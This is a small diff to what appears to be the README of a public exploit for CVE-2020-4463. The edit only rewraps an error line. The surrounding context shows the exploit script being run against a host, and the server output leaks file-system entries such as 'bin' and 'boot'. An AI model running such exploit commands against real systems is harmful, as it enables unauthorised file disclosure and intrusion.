@@ -110,7 +110,8 @@ CVE-2020-4463 git:(master) ✗ python3 CVE-2020-4463.py --url https://10.0.0.1 -
 ```
 CVE-2020-4463 git:(master) ✗ python3 CVE-2020-4463.py --url https://10.0.0.1 -x          
 
-Error 500: BMXAA4160E - A major exception has occurred. Check the system log to see if there are any companion errors logged. Report this error to your system administrator.
+Error 500: BMXAA4160E - A major exception has occurred. Check the system log to see if there 
+are any companion errors logged. Report this error to your system administrator.
 	/c: &#40;No such file or directory&#41;
 Error 500: For input string: &quot;bin
 boot
